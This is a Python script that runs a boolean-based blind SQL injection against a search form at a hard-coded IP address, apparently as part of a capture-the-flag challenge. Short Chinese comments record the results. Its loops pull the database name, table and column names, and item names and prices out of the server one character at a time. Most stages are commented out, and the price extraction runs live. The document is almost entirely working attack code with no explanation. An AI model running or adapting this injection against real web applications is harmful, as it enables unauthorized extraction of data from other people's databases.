import requests
from base64 import b64decode
s=requests.Session()
# for j in range(1,8):
# 	for i in range(64,123):
# 		pad='-1\' or (ascii(substr(database(),'+str(j)+",1)))="+str(i)+'#'
# 		payload={'search':pad}
# 		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
# 		if "This item exists" in content:
# 			print(chr(i),end='')

#拿到storeDB

# for j in range(1,8):
# 	for i in range(64,123):
# 		pad='-1\' or (ascii(substr((select table_name from information_schema.tables where table_schema="storeDB" limit 1),'+str(j)+',1)))='+str(i)+'#'
# 		payload={'search':pad}
# 		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
# 		if "This item exists" in content:
# 			print(chr(i))			

# 拿到items
# for j in range(1,20):
# 	for i in range(64,123):
# 		pad='-1\' or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="items"),'+str(j)+',1)))='+str(i)+'#'
# 		payload={'search':pad}
# 		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
# 		if "This item exists" in content:
# 			print(chr(i),end='')

#idnameprice

# for j in range(1,100):
# 	for i in range(30,127):
# 		pad='-1\' or (ascii(substr((select group_concat(name) from items),'+str(j)+',1)))='+str(i)+'#'
# 		payload={'search':pad}
# 		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
# 		if "This item exists" in content:
# 			print(chr(i))


for j in range(1,100):
	for i in range(30,58):
		pad='-1\' or (ascii(substr((select group_concat(price) from items),'+str(j)+',1)))='+str(i)+'#'
		payload={'search':pad}
		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
		if "This item exists" in content:
			print(chr(i))
#price 1,2,1,1,1..168

# for j in range(1,20):
# 	for i in range(64,123):
# 		pad='-1\' or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),'+str(j)+',1)))='+str(i)+'#'
# 		payload={'search':pad}
# 		content=s.post('http://120.27.3.220:10002/trueorfalse.php',data=payload).text
# 		if "This item exists" in content:
# 			print(chr(i),end='')

